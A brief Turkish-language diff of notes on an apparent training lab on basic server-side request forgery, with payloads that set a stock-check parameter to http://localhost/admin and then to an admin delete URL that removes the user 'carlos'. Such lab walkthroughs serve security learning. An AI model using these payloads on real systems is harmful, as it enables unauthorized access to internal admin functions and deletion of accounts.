@@ -1,0 +1,12 @@
+1
+
+Laboratuvar: Yerel sunucuya karşı temel SSRF
+
+ADMİN PANELİNE ULAŞMAK İÇİN
+stok kontrolüne bakılır ve parametre
+stockApi=blablabla ssrf var
+payload=http://localhost/admin
+stockApi=http://localhost/admin yazılır send ve admin paneline girilir.
+response üzerinden carlos kullanıcısını nasıl silebileceğimizi de görebiliyoruz.
+KULLANICI SİLMEK İÇİN PAYLOAD
+StockApi= http://localhost/admin/delete?username=carlos
